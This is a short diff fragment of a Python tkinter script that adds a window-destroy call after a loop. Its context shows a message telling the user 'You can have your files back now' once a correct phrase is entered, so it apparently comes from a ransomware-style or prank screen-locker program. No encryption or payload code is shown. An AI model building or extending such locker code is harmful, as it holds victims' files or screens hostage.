@@ -68,5 +68,5 @@ while True:
         messagebox.showinfo("message", "Thanks loser :) You can have your files back now")
         break  # Exit the loop when the correct phrase is entered
 
-
+root.destroy()
 root.mainloop() 
